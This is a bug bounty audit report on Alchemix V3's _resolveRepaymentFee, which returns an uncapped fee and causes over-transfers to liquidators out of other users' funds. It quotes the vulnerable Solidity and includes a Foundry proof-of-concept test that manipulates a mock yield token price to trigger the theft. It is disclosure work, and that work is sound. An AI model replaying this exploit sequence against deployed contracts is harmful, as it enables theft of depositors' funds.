# 57330 sc critical resolverepaymentfee returns initial fee when fee is greater collateral balance

**Submitted on Oct 25th 2025 at 09:49:55 UTC by @Josh4324 for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #57330
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The \_resolveRepaymentFee function in the AlchemistV3 contract calculates and returns a repayment fee based on the repaid yield amount, but it always returns and emits the full calculated fee even when it exceeds the account's remaining collateral balance. In such cases, only the available balance is deducted, leading to mismatches between returned/emitted values and actual deductions. This can cause misleading events, and over-transfers in upstream functions, resulting in fund theft from the funds in the alchemist contract.

## Vulnerability Details

```sol
function _liquidate(uint256 accountId) internal returns (uint256 amountLiquidated, uint256 feeInYield, uint256 feeInUnderlying) {
        // Query transmuter and earmark global debt
        _earmark();
        // Sync current user debt before deciding how much needs to be liquidated
        _sync(accountId);

        Account storage account = _accounts[accountId];

        // Early return if no debt exists
        if (account.debt == 0) {
            return (0, 0, 0);
        }

        // In the rare scenario where 1 share is worth 0 underlying asset
        if (IVaultV2(myt).convertToAssets(1e18) == 0) {
            return (0, 0, 0);
        }

        // Calculate initial collateralization ratio
        uint256 collateralInUnderlying = totalValue(accountId);
        uint256 collateralizationRatio = collateralInUnderlying * FIXED_POINT_SCALAR / account.debt;

        // If account is healthy, nothing to liquidate
        if (collateralizationRatio > collateralizationLowerBound) {
            return (0, 0, 0);
        }

        // Try to repay earmarked debt if it exists
        uint256 repaidAmountInYield = 0;
        if (account.earmarked > 0) {
            repaidAmountInYield = _forceRepay(accountId, account.earmarked);
        }
        // If debt is fully cleared, return with only the repaid amount, no liquidation needed, caller receives repayment fee
        if (account.debt == 0) {
   @>         feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
    @>        TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
            return (repaidAmountInYield, feeInYield, 0);
        }

        // Recalculate ratio after any repayment to determine if further liquidation is needed
        collateralInUnderlying = totalValue(accountId);
        collateralizationRatio = collateralInUnderlying * FIXED_POINT_SCALAR / account.debt;

        if (collateralizationRatio <= collateralizationLowerBound) {
            // Do actual liquidation
            return _doLiquidation(accountId, collateralInUnderlying, repaidAmountInYield);
        } else {
            // Since only a repayment happened, send repayment fee to caller
   @>       feeInYield = _resolveRepaymentFee(accountId, repaidAmountInYield);
 @>           TokenUtils.safeTransfer(myt, msg.sender, feeInYield);
            return (repaidAmountInYield, feeInYield, 0);
        }
    }
```

```sol
function _resolveRepaymentFee(uint256 accountId, uint256 repaidAmountInYield) internal returns (uint256 fee) {
        Account storage account = _accounts[accountId];
        // calculate repayment fee and deduct from account
        fee = repaidAmountInYield * repaymentFee / BPS;
@>        account.collateralBalance -= fee > account.collateralBalance ? account.collateralBalance : fee;
@>        emit RepaymentFee(accountId, repaidAmountInYield, msg.sender, fee);
 @>       return fee;
    }
```

When the calculated fee (repaidAmountInYield \* repaymentFee / BPS) is greater than the account's collateralBalance:

The deduction is capped: Only the collateral balance is subtracted. However, the function returns and emits the full uncapped fee.

This discrepancy means the \_liquidate function receives an overstated fee value, which is used for transfer to the liquidator. Since transfers pull from the contract's total MYT balance, this can over-transfer, stealing from other users.

## Impact Details

Over-transfers steals funds from other users.

## References

<https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/AlchemistV3.sol#L900>

## Proof of Concept

## Proof of Concept

Copy the test below into src/test/AlchemistV3.t.sol Run forge test --mt testFlow -vvvv

The test below shows that the \_liquidate function over transfer funds which inlcudes other users funds in order to pay the liquidator its repayment fee.

```sol
 function testFlow() external {
        vm.startPrank(alOwner);
        alchemist.setRepaymentFee(2000);
        vm.stopPrank();

        address josh = makeAddr("josh");

        vm.startPrank(josh);
        uint256 amount = 1000e18;
        SafeERC20.safeApprove(address(vault), address(alchemist), amount);

        alchemist.deposit(amount, josh, 0);

        uint256 tokenId = 1;

        uint256 maxBorrowable = alchemist.getMaxBorrowable(tokenId);
        alchemist.mint(tokenId, maxBorrowable, josh);

        vm.startPrank(address(0xdad));
        SafeERC20.safeApprove(address(alToken), address(transmuterLogic), 900e18);
        transmuterLogic.createRedemption(900e18);
        vm.stopPrank();

        // 5_256_000
        vm.roll(block.number + 5_256_000);

        vm.startPrank(josh);
        alchemist.poke(tokenId);
        SafeERC20.safeApprove(address(vault), address(alchemist), amount);

        uint256 total = alchemist.getTotalUnderlyingValue();

        (uint256 depositedCollateral1, uint256 debt1, uint256 earmarked1) = alchemist.getCDP(tokenId);

        // modify yield token price via modifying underlying token supply
        uint256 initialVaultSupply = IERC20(address(mockStrategyYieldToken)).totalSupply();
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(initialVaultSupply);
        // increasing yeild token suppy by 59 bps or 5.9%  while keeping the unederlying supply unchanged
        uint256 modifiedVaultSupply = (initialVaultSupply * 590 / 10_000) + initialVaultSupply;
        IMockYieldToken(mockStrategyYieldToken).updateMockTokenSupply(modifiedVaultSupply);

        vm.startPrank(address(0xbeef));
        SafeERC20.safeApprove(address(vault), address(alchemist), amount);
        alchemist.deposit(amount, address(0xbeef), 0);

        // There is am over transfer of funds in the _liquidate due to the _resolveRepaymentFee returned fee
        alchemist.liquidate(tokenId);

        (uint256 depositedCollateral2, uint256 debt2, uint256 earmarked2) = alchemist.getCDP(2);

        uint256 vBalance = vault.balanceOf(address(alchemist));

        // Assert than the Oxbeef user deposited balance is greater than the balance held by the alchemist contract
        assertGt(depositedCollateral2, vBalance);
    }
```
